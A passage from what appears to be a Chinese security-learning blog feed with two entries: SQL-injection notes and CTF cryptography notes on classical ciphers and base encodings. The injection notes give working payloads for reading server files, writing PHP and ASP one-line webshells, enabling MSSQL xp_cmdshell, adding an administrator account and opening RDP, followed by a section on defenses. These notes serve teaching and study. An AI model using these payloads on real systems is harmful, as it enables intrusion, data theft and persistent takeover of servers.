title="读取服务器敏感文件数据"></a>读取服务器敏感文件数据</h1><ol><li>两个前提条件：<ol><li>敏感文件存放的真实路径</li><li>数据库开启了读取文件的功能（用到<code>load_file</code>函数）</li></ol></li><li>注入语句：<code>d&#39; union select load_file(&quot;C:\\user\\1.txt&quot;)#</code>。注意：load_file函数使用<code>\\</code>作为路径分隔符且union联合查询前后<code>select</code>查询的列数要相同，差的列数用数字补齐。eg:<code>d&#39; union select 1, load_file(&quot;C:\\user\\1.txt&quot;)#</code></li></ol><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><h2 id="木马介绍"><a href="#木马介绍" class="headerlink" title="木马介绍"></a>木马介绍</h2><ol><li>木马介绍,木马其实就是一段程序，这个程序运行到目标主机上时，主要可以对目标进行远程控制、盗取信息等功能，一般不会破坏目标主机，当然，这也看黑客是否想要搞破坏。</li><li>按照功能分类：远控型、破坏型、流氓软件型、盗取信息型等等</li><li>按照连接方式分类：正向连接、反向连接、无连接等</li><li>按照功能大小分类：大马、小马、一句话木马。不同的开发语言，都可以写出这些木马程序，网上也能找到很多别人写好的木马程序掌来使用，但是使用别人的木马程序要小心程序中的后门，因为你的劳动成果,很有可能被后门窃取了。</li></ol><h2 id="一句话木马的简单使用"><a href="#一句话木马的简单使用" class="headerlink" title="一句话木马的简单使用"></a>一句话木马的简单使用</h2><ol><li>这里简单说一下php的一句话木马，然后通过sql注入将一句话木马写入目标服务器，再通过木马利用工具连接木马程序从而达到控制目标主机的效果。</li><li>一句话木马有四大利用工具：冰蝎、蚁剑、菜刀、哥斯拉（现在常用的是：冰蝎、蚁剑（antsword，github上下载））。</li><li>一句话木马使用操作：<ol><li>将一句话木马（php文件或其他文件）保存到目标主机。常用的一句话木马的php语句：<code>&lt;?php @eval($_POST[&#39;jaden&#39;]);?&gt;</code>，此处的jaden是密码，在后面使用蚁剑运行这个木马时要用到。</li><li>在蚁剑中创建该文件所在地址的url地址</li><li>运行蚁剑，即可获取目标主机的数据，以及shell（命令终端）</li></ol></li></ol><h2 id="通过注入点写入木马程序的前提条件"><a href="#通过注入点写入木马程序的前提条件" class="headerlink" title="通过注入点写入木马程序的前提条件"></a>通过注入点写入木马程序的前提条件</h2><ol><li>mysql开启了<code>secure_file_priv=&quot;&quot;</code>的配置，即允许sql语句进行文件读写的操作</li><li>知道网站代码的真实物理路径</li><li>物理路径具备写入权限</li><li>最好是mysql的root用户，这个条件非必须，但是有最好</li></ol><h2 id="注入点的注入语句"><a href="#注入点的注入语句" class="headerlink" title="注入点的注入语句"></a>注入点的注入语句</h2><ol><li><code>&#39; union select &quot;&lt;?php @eval($_POST[&#39;jaden&#39;]);?&gt;&quot;,2 into outfile &quot;C:\\phpStudy\\PHPTutorial\\www\\jaden.php&quot; #</code><ol><li>其中<code>into outfile</code>的作用是写入文件，如果没有该文件则创建一个该文件。</li><li><code>&quot;C:\\phpStudy\\PHPTutorial\\www\\jaden.php&quot;</code>是写入文件地址，即网站代码所在的真实物理地址</li></ol></li></ol><h2 id="获取站点真实物理路径的各种方法"><a href="#获取站点真实物理路径的各种方法" class="headerlink" title="获取站点真实物理路径的各种方法"></a>获取站点真实物理路径的各种方法</h2><ol><li>收集站点敏感目录，比如phpinfo.php探针文件（其中会包含网址的许多信息包括真实物理路径）是否可以访问到</li><li>站点网址输入一些不存在的网址或者加一些非法参数数据，让网站报错，看错误信息中是否存在路径信息</li><li>指纹信息收集：<ol><li>nginx默认站点目录：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html，配置文件路径：&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</li><li>apachre默认站点目录：&#x2F;var&#x2F;www&#x2F;html</li></ol></li><li>通过站点其他漏洞来获取配置信息、真实物理路径信息，比如如果发现远程命令执行漏洞，针对php的站点，直接执行一个phpinfo()函数，可以看到phpinfo.php所展示的各种信息等等。（phpinfo.php探针文件里面就包含phpinfo()函数）</li></ol><h1 id="access数据库"><a href="#access数据库" class="headerlink" title="access数据库"></a>access数据库</h1><ol><li>如果找到表的真实物理路径，可以通过在浏览器中输入路径，直接将其下载下来</li><li>access数据库的注入语句一般不用加注释符，因为其后台代码中接收参数的后面一般其他语句</li><li>主要靠暴力猜解：<ol><li>猜表名(users)：<code>and exists(select * from users)</code></li><li>猜字段名（列名: username）：<code>and exists(select username from users)</code></li><li>存在则exists函数返回1</li></ol></li><li>access数据库对应mysql的关键字：<code>top</code>对应<code>limit</code>，<code>len</code>对应<code>length</code></li></ol><h1 id="mssql（sqlserver）数据库"><a href="#mssql（sqlserver）数据库" class="headerlink" title="mssql（sqlserver）数据库"></a>mssql（sqlserver）数据库</h1><ol><li><p>主要使用报错注入</p></li><li><p>他对数据类型要求更严格，不允许不同类型进行比较</p></li><li><p>mssql有三类权限：sa（sysadmin）、db_owner、public，sa是最高权限<img src="/../%E5%9B%BE%E7%89%87/sql%E6%B3%A8%E5%85%A5.assets/image-20240727094738287.png" alt="image-20240727094738287"></p></li><li><p>sysobjects是mssql自带的系统表，可以通过此表来判断是否是mssql数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects)</span><br></pre></td></tr></table></figure></li></ol><h2 id="sa权限"><a href="#sa权限" class="headerlink" title="sa权限"></a>sa权限</h2><ol><li>如何判断当前用户是否具备sa权限：<code>and 1=(select IS_SRVROLEMEMBER(&#39;sysadmin&#39;))</code></li><li>判断是否开启xp_cmdshell权限：<code>and 1=(select count(*) from master.dbo.sysobjects where name=&#39;xp_cmdshell&#39;)</code><ol><li>xp_cmdshell是mssql数据库的扩展存储功能，这个功能可以直接执行操作系统的指令（ipconfig、pwd等），默认情况下这个功能是禁用的。这个功能只能是sa这样的权限用户才能开启，db_owner、public都不能开启</li><li>报错则没有开启</li><li>恢复xp_cmdshell：<code>EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;--</code></li></ol></li><li>开启xp_cmdshell权限后：<ol><li>添加jaden账户：<code>;exec master..xp_cmdshell &#39;net user jaden 123456 /add&#39;</code>，其中13456是密码</li><li>将jaden账号添加到管理员组：<code>;exec master..xp_cmdshell &#39;net localgroup jaden 123456 /add&#39;</code>，123456是密码</li><li>开启3389远程连接端口：既然已经是管理员组的用户，那么开启3389端口就可以远程控制别人的电脑。<code>;exec master.dbo.xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\TerminalServer&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0</code></li></ol></li></ol><h2 id="db-owner权限"><a href="#db-owner权限" class="headerlink" title="db_owner权限"></a>db_owner权限</h2><ol><li><p>查看当前网站是否为db_owner权限；<code>and 1=(SELECT IS_MEMBER(&#39;db_owner&#39;));--</code></p></li><li><p>同样，如果网页没有开启xp_cmdshell功能，是无法getshell的</p></li><li><p>寻找网页真实路径（当前网址：<code>192.168.31.133/sqlserver/1.aspx?xxser=1</code>）：</p><ol><li><p>通过报错（注入语句查询）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> black;<span class="keyword">create Table</span> black(<span class="keyword">result</span> <span class="type">varchar</span>(<span class="number">7996</span>) bull, id <span class="keyword">in</span> <span class="keyword">not null</span> <span class="keyword">identity</span> (<span class="number">1</span>,<span class="number">1</span>))<span class="comment">--           #删除black表，在创建black表</span></span><br><span class="line"><span class="keyword">insert into</span> black <span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;dir /s c:\1.aspx&#x27;</span><span class="comment">--           #向black表中插入&#x27;dir /s c:\1.aspx&#x27;这个系统指令的执行结果，1.aspx是当前网址文件</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">result</span> <span class="keyword">from</span> black <span class="keyword">where</span> id<span class="operator">=</span><span class="number">4</span>)<span class="operator">&gt;</span><span class="number">0</span><span class="comment">--   #查找black表中的数据，即网站真实路径</span></span><br></pre></td></tr></table></figure></li><li><p>在百度或其他网页上搜索该网页的敏感信息</p></li></ol></li><li><p>一句话木马获得getshell：</p><ol><li>向真实物理路径写入一句话木马程序：<code>%20;exec%20master..xp_cmdshell%20&#39;Echo%20&quot;&lt;%eval%20request(&quot;jaden&quot;)%&gt;&quot;%20&gt;&gt;%20c:\www\wwwroot\sqlserver\muma.asp&#39;--</code>（url编码格式），’c:\www\wwwroot\sqlserver’是网站的真实物理路径，muma.asp是存放一句话木马的文件。</li><li>用蚁剑控制该目标主机</li></ol></li></ol><h2 id="public权限"><a href="#public权限" class="headerlink" title="public权限"></a>public权限</h2><ol><li>获取当前网站数据库名称：<code>and db_name()=0--</code></li><li>获取mssql所有数据库名：<ol><li><code>and 1=(select db_name())--+</code></li><li><code>and 1=(select db_name(1))--+</code></li><li><code>and 1=(select db_name(2))--+</code></li><li>将数字已知枚举下去即可</li></ol></li><li>获取当前数据库所有表名：<ol><li><code>select top 1 name from 当前数据库名.sys.all_objects where type=&#39;U&#39; AND is_ms_shipped=0 and name not in (select top i name from 当前数据库名.sys.all_objects where type=&#39;U&#39; AND is_ms_shipped=())</code>，通过修改i值查看不同表名</li></ol></li><li>获取表名和字段名：</li><li>获取字段内容</li></ol><h1 id="mysql的版本区别"><a href="#mysql的版本区别" class="headerlink" title="mysql的版本区别"></a>mysql的版本区别</h1><ol><li>mysql5.0以及5.0以上的版本都存在一个系统自带的系统数据库，叫做：information_schema，mysql5.0以下没有information_schema库，只能通过暴力猜解的方式来获取数据，information_schema库里面包含了很多表，其中这几张表：schemata、tables、columns，这三张表依次分别存放着字段：（schema_name-库名）、（table_name-表名、table_schema-库名）、（column_name-字段名、table_name-表名、table_schema-库名），其次就是5.0以上都是多用户多操作，5.0以下是多用户单操作。<img src="/../%E5%9B%BE%E7%89%87/sql%E6%B3%A8%E5%85%A5.assets/image-20240728152647978.png" alt="image-20240728152647978"></li><li>mysql5.7和mysql8的区别：（先作为了解）<ol><li>创建用户和授权：<ol><li>mysql5.7可以一句话搞定：<code>grant all privileges on *.* &#39;user&#39;@&#39;%&#39; identified by &#39;123456&#39;;</code></li><li>mysql8必须分开做：<code>create user &#39;user&#39;@&#39;%&#39; identified by &#39;123456&#39;;</code>，<code>grant all privileges on *.* to &#39;user&#39;@&#39;%&#39;;</code></li></ol></li><li>table函数<ol><li>table函数为MYSQL8版本中新增的函数，其作用与select类似。</li><li><code>table users;</code>等同于：<code>select * from users;</code></li><li>但是table查询时，显示的始终是表的所有列，而且不可以用where字句来限定某个特定的行。</li></ol></li><li>values函数：<code>select * from user union VALUES Row(2,3);</code>等同于<code>select * from user union select 2,3;</code></li></ol></li></ol><h1 id="sql注入防护"><a href="#sql注入防护" class="headerlink" title="sql注入防护"></a>sql注入防护</h1><ol><li><p>所有数据库的防护手段基本都一样，就是对用户提交的数据作严格的过滤</p></li><li><p>方式</p><ol><li><p>对提交的数据进行数据类型判断，比如id值就是数字：<code>is_numeric($id)</code></p></li><li><p>对提交的数据进行正则匹配，禁止出现注入语句，比如union、or、and等</p></li><li><p>对提交数据进行特殊符号转义，比如单引号、双引号等，用addslash等函数加工一下</p></li><li><p>不使用sql语句拼接参数的方式来执行sql语句，而是用参数化查询，也叫做参数绑定的方式，对提交的参数进行预编译然后进行参数绑定，这样会将用户提交的注入语句作为参数值来处理，而不是当作sql语句执行，这样可以有效的方法sq1注入：不同语言的写法不同，但是原理相同。 </p><ol><li><code>$data =Sdb-&gt;prepare(&#39;SELECT first_name,last_name FROM users WHERE user_id =(:id)LIMIT 1;&#39;);</code></li><li><code>$data-&gt;bindParam(&#39;:id&#39;,Sid,PDO::PARAM_INT); </code></li><li><code>$data-&gt;execute();</code></li></ol></li><li><p>但是预编译也不能完全解决sql注入问题，比如如果查询语句中表名是动态的，也就是说表名也是用户可以提交过来的数据，根据用户提交的表名来进行不同表数据的查询，那么也会出现sql注入漏洞，因为表名不能进行预编译及参数绑定，下面就报错 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$table_name<span class="operator">=</span><span class="string">&#x27;jaden&#x27;</span>;</span><br><span class="line">$data <span class="operator">=</span> $db<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">prepare</span>(<span class="string">&#x27;SELECT first_name,last_name FROM(:table_name) WHERE user_id =(:id)LIMIT 1;&#x27;</span>);</span><br><span class="line">#这种就需要配合白名单进行过滤：</span><br><span class="line">if($table_name <span class="operator">=</span><span class="operator">=</span><span class="string">&#x27;jaden&#x27;</span>)&#123;</span><br><span class="line"> $data <span class="operator">=</span>$db<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">prepare</span>(<span class="string">&#x27;SELECT first_name,last_name FROM jaden WHERE user_id =(:id)LIMIT 1;&#x27;</span>); </span><br><span class="line"> &#125;</span><br><span class="line"> elif($table_name <span class="operator">=</span><span class="operator">=</span><span class="string">&#x27;wulaoban&#x27;</span>)&#123;</span><br><span class="line"> $data <span class="operator">=</span>$db<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">prepare</span>(<span class="string">&#x27;SELECT first_name,last_name FROM wulaoban WHERE user_id =(:id)LIMIT 1;&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line"> echo<span class="string">&#x27;别乱搞!&#x27;</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>分级管理：用户的权限要进行严格控制和划分，服务端代码连接数据库使用的用户禁止使用root等高权限用户。比如对用户进行分级管理，严格控制用户的权限，对于普通用户，禁止给予数据库建立、删除、修改等相关权限，只有系统管理员才具有增、删、改、查的权限等等。</li><li>数据库中敏感的数据，比如用户的密码，要加密存储。</li><li>总体来说：<ol><li>永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对特殊字符和符号进行转换等。</li><li>永远不要使用动态拼装sql,可以使用参数化的sql或者直接使用存储过程进行数据查询存取</li></ol></li></ol></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码笔记</title>
      <link href="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol><li>密码可分为古典密码和现代密码。</li><li>古典密码基本可分为两类，替换密码和移位密码。替代密码又可以分为单表替代密码，多表替代密码。</li><li>古典密码中有凯撒密码，栅栏密码，摩斯密码，培根密码，维吉尼亚密码，经典单表替代密码等。</li><li>基本的移位密码：曲路密码，云影密码，栅栏密码····</li><li>基本的替换密码:<ol><li>单表替代密码：凯撒密码，摩斯密码，培根密码，仿射密码···</li><li>多表替代密码：棋盘密码，维吉尼亚密码···</li></ol></li><li>替换密码+词频分析:<a href="https://quipqiup.com/">https://quipqiup.com/</a></li><li>看到*****，<strong>@</strong>，**#**等符号可以想到单表替换密码或者移位密码</li><li>看到%且后面有两个字符，字母或者数字（16进制）可以想到url编码</li><li>在用解密网站的时候，注意有些时候多了空格或换行就会出现解密失败，最好解密时将多的换行和空格去掉</li><li>做题时，可能给你一个名字叫zip的文件，点开发现是乱码（buuctf的大帝的秘码武器一题）。解题思路：文件名zip，提示我们这是一个zip文件，再看文件扩展名，没有。于是我们自己添加一个文件名，把zip变成文件扩展名。</li><li>题目中说是古典密码时，可能时多个密码同时使用，例如 传统知识+古典密码：先是利用天干地支对应的年数算出数值，再以此找ASCII中对应的字母，在进行栅栏密码解密，解密后用凯撒密码解密。</li><li>下发容器类的ctf的题目：题中给：nc 114.116.54.89 10001<ol><li>其中nc 114.116.54.89是ip地址，10001是端口值</li><li>在<a href="https://so.csdn.net/so/search?q=Linux&spm=1001.2101.3001.7020">Linux</a>里面运行输入命令 nc 114.116.54.89 10001，如果是‘ node4.buuoj.cn:26400 ’，就是nc node4.buuoj.cn 26400</li><li>例如：<a href="https://blog.csdn.net/qq_42777804/article/details/92599480">https://blog.csdn.net/qq_42777804&#x2F;article&#x2F;details&#x2F;92599480</a></li><li>用python的IDLE，输入代码</li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># nc 114.116.54.89 10001</span><br><span class="line">from pwn import *</span><br><span class="line">p=connect(&#x27;nc 114.116.54.89&#x27;,10001)</span><br><span class="line">p.sendline(b&#x27;内容&#x27;)</span><br><span class="line">print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../%E5%9B%BE%E7%89%87/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0.assets/image-20240713220644745-1721657068362-6.png" alt="image-20240713220644745"></p><ol start="13"><li>但只有一串数字时，有两种较大的可能性：<ol><li>整数转字符串（转成16进制再由ascii转，用函数long_to_bytes即可）</li><li>直接对10进制整数分割转字符（由可见字符的范围分割）</li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">i = 0</span><br><span class="line">result = input(&#x27;十进制数字&#x27;)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">while i&lt;len(result): #ascii的方式解得，flag需要是可见字符，所以不存在1开头的十位数，所以1开头的肯定是100以上的三位数，</span><br><span class="line">    if result[i]==&#x27;1&#x27;:</span><br><span class="line">        flag = flag +chr(int(result[i:i+3]))</span><br><span class="line">        i = i+3</span><br><span class="line">    else:</span><br><span class="line">        flag = flag +chr(int(result[i:i+2]))</span><br><span class="line">        i = i+2</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><ol start="14"><li>枚举函数：itertools.product()</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = string.printable[:62]  #生成只含且包含所有并且不重复的数字和大小写字母的字符串</span><br><span class="line">for i in itertools.product(a,repeat=4): #遍历由a字符串中所含的字符构成所有可能的长度为4的字符串</span><br><span class="line">i =&quot;&quot;.join(i)  #因为此时i是元组的形式，每个元素是一个字符。所以需要将列表i中的所有元素合并为一个字符串。</span><br><span class="line"></span><br><span class="line">枚举字符不重复的字符串</span><br><span class="line">a = string.printable[:62] </span><br><span class="line">for i in itertools.product(a,repeat=4):</span><br><span class="line">  if len(set(i)) == len(i):</span><br><span class="line">i =&quot;&quot;.join(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意：在itertools.product()函数中的str类型的实参中不能有重复的字符，即eg中的变量a中不能有重复字符</p><h1 id="base64："><a href="#base64：" class="headerlink" title="base64："></a>base64：</h1><ol><li><p><a href="http://www.metools.info/code/c20.html">http://www.metools.info/code/c20.html</a></p></li><li><p><a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89('GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ/12%2B406789VaqrstuvwxyzABCDEF5',true)&input=ajJyWGp4OHlqZD1ZUlpXeVRJdXdSZGJ5UWRicVIzUjlpWm1zU2N1dGoyaXFqMy90aWRqMWpkPUQzMQ">https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89(‘GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ&#x2F;12%2B406789VaqrstuvwxyzABCDEF5’,true)&amp;input&#x3D;ajJyWGp4OHlqZD1ZUlpXeVRJdXdSZGJ5UWRicVIzUjlpWm1zU2N1dGoyaXFqMy90aWRqMWpkPUQzMQ</a>（在不知道具体的字母表只知道范围的时候也可以用这个）</p></li><li><p>标准的base64只有64个字符（英文大小写、数字和+、&#x2F;）以及后缀等号。</p></li><li><p>密文末尾有“<strong>&#x3D;</strong>”，且如果有&#x3D;，则必须在末尾。</p></li><li><p>编码后字符串的长度一定会被4整除（包括用作后缀的等号）。</p></li><li><p>添加等号的数目只能是0，1，2。   </p></li><li><p>加密代码中含有0xF、0x3F、0x3等符号。</p></li><li><p>加密解密函数：</p><ol><li><code>encoded_data = base64.b64encode(decoded_data)</code></li><li><code>decoded_data = base64.b64decode(encoded_data)</code></li></ol></li><li><p>base64变种考法（更换base64的码表，即在添加一个 替换密码）：</p><ol><li><p>可能题中给两行字符串，其中一行是密文，另一行字符串有64或65个字符，包含A-Z、a-z、0-9、+、&#x2F;、&#x3D;，可能会没有等号。这是base64密码表，其中有64或65个字符的字符串是对应“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;“（如果前面的字符串是长为64，则此字符串没有&#x3D;），先按着对应规则进行替换密码解密，再进行base64解密!<img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714114926842.png" alt="image-20240714114926842" style="zoom:70%;"></p><ol><li>此时需要python函数：str.maketrans函数(见常用函数) <ol><li><code>translation_table = str.maketrans(custom_alphabet, standard_alphabet)</code><br><code>output_string = input_string.translate(translation_table)</code></li><li><code>custom_alphabet</code>: 自定义字母表（字符串），即源字符集。你想要被替换的字符集。</li><li><code>standard_alphabet</code>: 标准字母表（字符串），即目标字符集。你想要替换成的字符集。</li><li><code>custom_alphabet-&gt;standard_alphabet</code>,将字符串中的字母按此规则一一替换。</li></ol></li></ol></li><li><p>也可以用网站<a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89('GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ/12%2B406789VaqrstuvwxyzABCDEF5',true)&input=ajJyWGp4OHlqZD1ZUlpXeVRJdXdSZGJ5UWRicVIzUjlpWm1zU2N1dGoyaXFqMy90aWRqMWpkPUQzMQ">https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89(‘GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ&#x2F;12%2B406789VaqrstuvwxyzABCDEF5’,true)&amp;input&#x3D;ajJyWGp4OHlqZD1ZUlpXeVRJdXdSZGJ5UWRicVIzUjlpWm1zU2N1dGoyaXFqMy90aWRqMWpkPUQzMQ</a></p></li><li><p>列题：CISCN2023WP中的sign in passwd</p></li></ol></li><li><p>base64加密方法：</p><ol><li><p>编码时，将要编码的内容转换为二进制数据（一个字符对应8位二进制），每6位作为一组，从索引表中找到对应的字符</p><ol><li>编码的文本字节数是3的倍数时，刚好可以编码成4个字符<img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714114955897.png" alt="image-20240714114955897" style="zoom:67%;"></li><li>编码的文本字节数是3的倍数时，刚好可以编码成4个字符<img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714115017240.png" alt="image-20240714115017240" style="zoom:67%;"></li><li>编码的文本字节数不是3的倍数时，剩下2个字符时<img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714115036958.png" alt="image-20240714115036958" style="zoom:67%;"></li></ol></li><li><p>解码：</p><ol><li><p>首先把填充字符&#x3D;去掉</p></li><li><p>每个字符查表转换为对应的6位索引，得到一串二进制字符串</p></li><li><p>接着从左到右，每8位一组，多余位丢掉，转为对应的字符</p></li></ol></li></ol></li><li><p>baee64隐写技术：</p><ol><li><p><a href="https://blog.csdn.net/Sanctuary1307/article/details/113836907">https://blog.csdn.net/Sanctuary1307/article/details/113836907</a></p></li><li><p>隐写原理：base64之所以可以隐藏信息，便是在于在解密过程中,在解码的第3步中，会有部分数据被丢弃（即不会影响解码结果），这些数据正是在编码过程中补的0。也就是说，如果在编码过程中不全用0填充，而是用其他的数据填充，仍然可以正常编码解码，因此这些位置可以用于隐写。解开隐写的方法就是将这些不影响解码结果的位提取出来组成二进制串（一行 base64 最多有 2 个等号。），然后转换成ASCII字符串。这就是为什么出base64隐写时会有很多大段 base64 的原因<img src="/../%E5%9B%BE%E7%89%87/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0.assets/image-20240714115109470-1721657127716-8.png" alt="image-20240714115109470"></p></li><li><p>需要注意的是等号的那部分 0 不能用于隐写，因为修改那里的二进制值会导致等号数量变化, 解码的第 1 步会受影响. 自然也就破坏了源字符串。</p></li></ol></li></ol><h1 id="base32："><a href="#base32：" class="headerlink" title="base32："></a>base32：</h1><ol><li><a href="http://www.hiencode.com/base64.html">http://www.hiencode.com/base64.html</a></li><li>也用**&#x3D;**做填充字符，最多6个</li><li>使用32个可打印字符（大写字母，和数字2-7，<strong>没有小写字母</strong>）</li><li>编码后的字符串不用区分大小写并派出了容易混淆的字符</li><li>密文一般比base64长</li></ol><h1 id="base16（又叫HEX编码，和HEX编码的唯一差别是在密文的大小写上）："><a href="#base16（又叫HEX编码，和HEX编码的唯一差别是在密文的大小写上）：" class="headerlink" title="base16（又叫HEX编码，和HEX编码的唯一差别是在密文的大小写上）："></a>base16（又叫HEX编码，和HEX编码的唯一差别是在密文的大小写上）：</h1><ol><li><a href="https://ctf.bugku.com/tool/base16">https://ctf.bugku.com/tool/base16</a></li><li>一般密文开头是0x后面是一串数字和字母（0x意思是16进制）</li><li>无**&#x3D;**</li><li>由数字0-9和字母A-F组成</li><li>数字多余字母</li><li>转码规则相当于将明文对应的ASCII值转成16进制</li><li>一般base16的密文长度为2的倍数</li></ol><h1 id="HEX编码："><a href="#HEX编码：" class="headerlink" title="HEX编码："></a>HEX编码：</h1><ol><li><a href="https://www.107000.com/T-Hex/">https://www.107000.com/T-Hex/</a></li></ol><h1 id="base36："><a href="#base36：" class="headerlink" title="base36："></a>base36：</h1><ol><li><a href="http://ctf.ssleye.com/base64.html">http://ctf.ssleye.com/base64.html</a></li><li>密文由16个字符（0-9,A-F）组成</li></ol><h1 id="base58的特征："><a href="#base58的特征：" class="headerlink" title="base58的特征："></a>base58的特征：</h1><ol><li><a href="http://www.hiencode.com/base58w.html">http://www.hiencode.com/base58w.html</a></li><li>base58不使用数字0，字母大写O，字母大写I，字母小写l以及+，&#x2F;</li><li>字母多于数字</li><li>结尾没有**&#x3D;**</li></ol><h1 id="base62："><a href="#base62：" class="headerlink" title="base62："></a>base62：</h1><ol><li><a href="https://ctf.bugku.com/tool/base62">https://ctf.bugku.com/tool/base62</a></li><li>密文由62字符（0-9，a-z，A-Z）组成</li></ol><h1 id="base85："><a href="#base85：" class="headerlink" title="base85："></a>base85：</h1><ol><li>**&#x3D;**出现在字符串中间</li><li>奇怪的字符比较多</li></ol><h1 id="base91："><a href="#base91：" class="headerlink" title="base91："></a>base91：</h1><ol><li><a href="https://ctf.bugku.com/tool/base91">https://ctf.bugku.com/tool/base91</a></li><li>密文由91个字符（<strong>0-9</strong>，<strong>a-z</strong>，**A-Z **, <strong>!#$%&amp;()*+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~”</strong>）组成</li></ol><h1 id="base100："><a href="#base100：" class="headerlink" title="base100："></a>base100：</h1><ol><li>密文由emoji表情组成</li></ol><h1 id="ASCII编码："><a href="#ASCII编码：" class="headerlink" title="ASCII编码："></a>ASCII编码：</h1><ol><li><a href="http://www.hiencode.com/cencode.html">http://www.hiencode.com/cencode.html</a></li><li>密文是0-9组成，是十进制，当然也可能是8或16进制的ASCII</li></ol><h1 id="Escape-编码："><a href="#Escape-编码：" class="headerlink" title="Escape()编码："></a>Escape()编码：</h1><ol><li><a href="http://www.hiencode.com/escape.html">http://www.hiencode.com/escape.html</a></li><li>如果密文中有“%”，形式为“%xx”和“%uxxxx”</li><li>字符范围是16进制的“0-F”</li></ol><h1 id="Jother编码："><a href="#Jother编码：" class="headerlink" title="Jother编码："></a>Jother编码：</h1><ol><li>jother直接在浏览器(IE可以)的控制台里输入密文即可执行解密</li><li>密文由8个字符“<strong>[]</strong>,<strong>()</strong>,<strong>{}</strong>,<strong>+</strong>,<strong>!</strong>”字符组成的编码，比jsfuck编码多了**{}**</li></ol><h1 id="JSfuck编码："><a href="#JSfuck编码：" class="headerlink" title="JSfuck编码："></a>JSfuck编码：</h1><ol><li><a 